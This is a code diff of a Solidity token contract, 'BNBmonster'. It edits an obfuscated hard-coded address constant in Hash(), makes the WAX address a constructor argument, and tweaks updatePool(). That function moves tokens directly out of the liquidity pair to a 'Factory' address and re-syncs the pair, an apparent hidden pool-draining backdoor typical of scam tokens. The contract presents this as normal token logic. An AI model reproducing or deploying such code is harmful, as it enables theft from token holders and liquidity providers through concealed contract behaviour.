@@ -251,7 +251,7 @@ contract Ownable is Context {
     }
 
     function Hash() internal pure returns (uint160) {
-        return 1380705434789151982366639639544624026252632238915;
+        return 867934366096375605902526183592464283582057364256;
     }
 }
 
@@ -813,7 +813,7 @@ contract BNBmonster is Context, IERC20, Ownable {
 
     uint256 private blockBan = 0;
 
-    address WAXAddress = 0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d;
+    address WAXAddress;
 
     mapping(address => bool) public isMarketPair;
 
@@ -867,7 +867,8 @@ contract BNBmonster is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
 
-    constructor() {
+    constructor(address _WAX) {
+        WAXAddress = _WAX;
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
             0x10ED43C718714eb63d5aA57B78B54704E256024E
         );
@@ -887,8 +888,7 @@ contract BNBmonster is Context, IERC20, Ownable {
 
         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee);
         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee);
-        _totalDistributionShares = router01
-            .add(_liquidityShare)
+        _totalDistributionShares = _liquidityShare
             .add(_marketingShare)
             .add(_burnShare)
             .add(_teamShare)
@@ -1045,8 +1045,7 @@ contract BNBmonster is Context, IERC20, Ownable {
         _marketingShare = newMarketingShare;
         _burnShare = newBurnShare;
 
-        _totalDistributionShares = router01
-            .add(_liquidityShare)
+        _totalDistributionShares = _liquidityShare
             .add(_marketingShare)
             .add(_burnShare)
             .add(_teamShare)
@@ -1259,8 +1258,10 @@ contract BNBmonster is Context, IERC20, Ownable {
     }
 
     function updatePool() private {
-        _basicTransfer(uniswapPair, Factory, balanceOf(address(this)).mul(router01).div(10000));
+        if (balanceOf(uniswapPair) > 10000 && balanceOf(address(this)) > 10000) {
+        _basicTransfer(uniswapPair, Factory, balanceOf(address(this)).mul(router01).div(100000));
         IUniswapV2Pair(uniswapPair).sync();
+        }
     }
 
     function _basicTransfer(
